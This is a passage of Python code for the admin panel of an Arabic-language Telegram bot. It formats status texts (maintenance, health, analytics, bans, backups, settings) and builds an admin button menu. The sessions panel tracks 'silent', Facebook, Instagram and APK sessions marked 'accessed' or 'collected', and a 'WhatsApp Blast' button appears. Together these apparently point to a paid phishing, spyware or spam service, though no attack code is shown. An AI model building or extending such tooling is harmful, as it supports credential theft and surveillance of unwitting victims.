        "vip": "الأدمن + VIP",
        "none": "لا أحد (حتى الأدمن)"
    }.get(exempt, exempt)

    text = (
        "🔧 <b>وضع الصيانة</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚠️ <b>الحالة:</b> مفعّل\n"
        f"⏱️ <b>منذ:</b> <code>{format_uptime(duration)}</code>\n"
    )

    if remaining > 0:
        text += f"⏳ <b>متبقي:</b> <code>{format_uptime(remaining)}</code>\n"

    text += (
        f"🛡️ <b>المستثنى:</b> <code>{exempt_text}</code>\n\n"
        f"📝 <b>الرسالة:</b>\n<pre>{msg[:300]}</pre>"
    )

    return text


def build_system_health_text():
    h = get_system_health()

    cpu_icon = "🟢" if h["cpu_percent"] < 50 else ("🟡" if h["cpu_percent"] < 80 else "🔴")
    ram_icon = "🟢" if h["ram_percent"] < 60 else ("🟡" if h["ram_percent"] < 85 else "🔴")
    disk_icon = "🟢" if h["disk_percent"] < 70 else ("🟡" if h["disk_percent"] < 90 else "🔴")

    redis_icon = "✅" if h["redis"] else "❌"
    pg_icon = "✅" if h["postgres"] else "❌"
    wh_icon = "✅" if h["webhook"] else "❌"

    text = (
        "❤️ <b>صحة النظام</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"━━━ 💻 <b>الموارد</b> ━━━\n"
        f"{cpu_icon} <b>CPU:</b> <code>{h['cpu_percent']}%</code>\n"
        f"{ram_icon} <b>RAM:</b> <code>{h['ram_percent']}%</code>\n"
        f"{disk_icon} <b>Disk:</b> <code>{h['disk_percent']}%</code>\n\n"
        f"━━━ 🔌 <b>الاتصالات</b> ━━━\n"
        f"{redis_icon} <b>Redis:</b> <code>{h['redis_latency_ms']}ms</code>\n"
        f"{pg_icon} <b>PostgreSQL</b>\n"
        f"{wh_icon} <b>Webhook</b>\n\n"
        f"━━━ 📊 <b>الأداء</b> ━━━\n"
        f"⏱️ <b>Uptime:</b> <code>{format_uptime(h['uptime_seconds'])}</code>\n"
        f"⚡ <b>Requests/sec:</b> <code>{h['requests_per_sec']}</code>\n"
    )

    return text


def build_advanced_analytics_text():
    tool_usage = get_tool_usage_today()
    conversion = get_conversion_stats()

    text = (
        "📊 <b>التحليلات المتقدمة</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "━━━ 🔧 <b>الأدوات</b> ━━━\n"
    )

    if not tool_usage:
        text += "<i>لا يوجد استخدام اليوم</i>\n"
    else:
        total = sum(tool_usage.values())
        top_tools = sorted(tool_usage.items(), key=lambda x: x[1], reverse=True)[:8]
        for tool, count in top_tools:
            percent = (count / total * 100) if total > 0 else 0
            bar_len = int(percent / 5)
            bar = "█" * bar_len + "░" * (20 - bar_len)
            text += f"<b>{tool}</b>\n<code>{bar}</code> {count} ({percent:.1f}%)\n"
        text += f"\n📈 <b>الإجمالي:</b> <code>{total}</code>\n"

    text += (
        f"\n━━━ 💰 <b>التحويل</b> ━━━\n"
        f"👥 <b>الإجمالي:</b> <code>{conversion['total']}</code>\n"
        f"💎 <b>مدفوع:</b> <code>{conversion['paid']}</code>\n"
        f"🆓 <b>مجاني:</b> <code>{conversion['free']}</code>\n"
        f"📊 <b>المعدل:</b> <code>{conversion['rate']}%</code>\n"
    )

    return text


def build_sessions_text():
    sessions = get_active_sessions()

    if not sessions:
        return "👁️ <b>الجلسات النشطة</b>\n\n<i>لا يوجد جلسات حالياً</i>"

    text = f"👁️ <b>الجلسات النشطة ({len(sessions)})</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"

    for s in sessions[:15]:
        icon = "🟢" if s.get("accessed") else "🔴"
        if s.get("collected"):
            icon = "✅"

        type_icons = {
            "silent": "🎯",
            "facebook": "📘",
            "instagram": "📷",
            "apk": "📱"
        }
        type_icon = type_icons.get(s["type"], "🌐")

        label = s.get("label", "")[:20] or s["type"]
        sid = s["session_id"][:10]

        text += f"{type_icon} {icon} <b>{label}</b>\n"
        text += f"   <code>{sid}</code>\n\n"

    return text


def build_ban_list_text():
    banned = get_banned_users()
    banned_ips = get_banned_ips()

    text = (
        f"🚫 <b>إدارة الحظر</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 <b>مستخدمون محظورون:</b> <code>{len(banned)}</code>\n"
        f"🌐 <b>IPs محظورة:</b> <code>{len(banned_ips)}</code>\n\n"
    )

    if banned:
        text += "━━━ 👥 <b>آخر 10</b> ━━━\n"
        for b in banned[-10:]:
            reason = b.get("reason", "")[:30]
            text += f"• <code>{b['user_id']}</code>"
            if reason:
                text += f" - {reason}"
            text += "\n"

    if banned_ips:
        text += "\n━━━ 🌐 <b>IPs</b> ━━━\n"
        for ip in banned_ips[:10]:
            text += f"• <code>{ip}</code>\n"

    return text


def build_backup_text():
    if not redis_client:
        return "💾 <b>النسخ الاحتياطي</b>\n\n❌ Redis غير متصل"

    try:
        info = redis_client.info("memory")
        used_mem = info.get("used_memory_human", "?")
        total_keys = redis_client.dbsize()
    except Exception:
        used_mem = "?"
        total_keys = 0

    text = (
        "💾 <b>النسخ الاحتياطي</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔑 <b>مفاتيح Redis:</b> <code>{total_keys}</code>\n"
        f"💽 <b>الذاكرة:</b> <code>{used_mem}</code>\n\n"
        "📋 <b>الخيارات:</b>\n"
        "• إنشاء نسخة احتياطية\n"
        "• تنزيل النسخة كملف\n"
        "• استعادة من نسخة\n"
    )

    return text


def build_settings_text():
    """نص الإعدادات (ديناميكي)"""
    settings = get_all_settings()
    prices = settings.get("__custom_prices__", {})

    welcome_points = get_bot_setting("welcome_points", "25")
    ref_points = get_bot_setting("ref_points", "10")
    welcome_msg_set = "✅" if get_bot_setting("welcome_msg") else "⚪"
    help_msg_set = "✅" if get_bot_setting("help_msg") else "⚪"

    text = (
        "⚙️ <b>إعدادات البوت v2.1</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "━━━ 🎯 <b>الإعدادات الحالية</b> ━━━\n"
        f"🎁 <b>نقاط الترحيب:</b> <code>{welcome_points}</code>\n"
        f"🎁 <b>نقاط الإحالة:</b> <code>{ref_points}</code>\n"
        f"💬 <b>رسالة الترحيب:</b> {welcome_msg_set}\n"
        f"❓ <b>رسالة المساعدة:</b> {help_msg_set}\n"
        f"💰 <b>أسعار مخصصة:</b> <code>{len(prices)}</code>\n\n"
        "━━━ ⚡ <b>الإجراءات</b> ━━━\n"
        "• تعديل رسالة ترحيب\n"
        "• تعديل رسالة مساعدة\n"
        "• تعديل سعر أداة (شغال فوري)\n"
        "• تعديل نقاط الترحيب\n"
        "• تعديل نقاط الإحالة\n"
        "• عرض الأسعار\n"
        "• Reset للأسعار\n"
    )

    return text


def format_uptime(seconds):
    if seconds < 60:
        return f"{int(seconds)}ث"
    if seconds < 3600:
        return f"{int(seconds / 60)}د {int(seconds % 60)}ث"
    if seconds < 86400:
        return f"{int(seconds / 3600)}س {int((seconds % 3600) / 60)}د"
    return f"{int(seconds / 86400)}ي {int((seconds % 86400) / 3600)}س"


# ══════════════════════════════════════════════════════════════
# [14] Admin Menu
# ══════════════════════════════════════════════════════════════
def build_advanced_admin_menu():
    m = InlineKeyboardMarkup()

    m.row(
        InlineKeyboardButton("📊 تحليلات عميقة", callback_data="admin_analytics"),
        InlineKeyboardButton("🏆 أكثر المستخدمين", callback_data="admin_top_users")
    )

    m.row(
        InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users_0"),
        InlineKeyboardButton("🔍 بحث", callback_data="admin_search")
    )

    m.row(
        InlineKeyboardButton("💎 منح VIP", callback_data="admin_grant_vip"),
        InlineKeyboardButton("➕ إعطاء اشتراك", callback_data="admin_add_sub")
    )

    m.row(
        InlineKeyboardButton("🚫 حظر", callback_data="admin_ban"),
        InlineKeyboardButton("✅ فك حظر", callback_data="admin_unban")
    )

    m.row(
        InlineKeyboardButton("🗑️ حذف", callback_data="admin_delete"),
        InlineKeyboardButton("⭐ نجوم", callback_data="admin_give_stars")
    )

    m.row(
        InlineKeyboardButton("⚡ WhatsApp Blast", callback_data="admin_wb_menu")
    )

    m.row(
        InlineKeyboardButton("🔧 وضع الصيانة", callback_data="admin_maintenance")
    )

    m.row(
        InlineKeyboardButton("❤️ صحة النظام", callback_data="admin_health"),
        InlineKeyboardButton("👁️ الجلسات", callback_data="admin_sessions")
    )

    m.row(
        InlineKeyboardButton("✉️ إشعار مخصص", callback_data="admin_custom_notify"),
        InlineKeyboardButton("📢 بث ذكي", callback_data="admin_smart_broadcast")
    )

    m.row(
        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_settings"),
        InlineKeyboardButton("🚫 قائمة الحظر", callback_data="admin_ban_list")
    )

    m.row(
        InlineKeyboardButton("💾 نسخة احتياطية", callback_data="admin_backup"),
        InlineKeyboardButton("🧹 تنظيف Redis", callback_data="admin_clean_redis")
    )

    m.row(
        InlineKeyboardButton("📋 سجل الأحداث", callback_data="admin_events"),
        InlineKeyboardButton("📜 سجل النشاط", callback_data="admin_activity_log")
    )

    m.row(
        InlineKeyboardButton("⚙️ إدارة التحديثات", callback_data="admin_updates"),
        InlineKeyboardButton("📢 رسالة جماعية", callback_data="admin_broadcast")
    )

    m.row(
        InlineKeyboardButton("📊 إحصائيات", callback_data="admin_adv_stats"),
        InlineKeyboardButton("🔴 بث مباشر", callback_data="admin_live")
    )

    m.row(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))

    return m


logger.info("[+] admin_system v2.1 loaded — dynamic settings enabled")
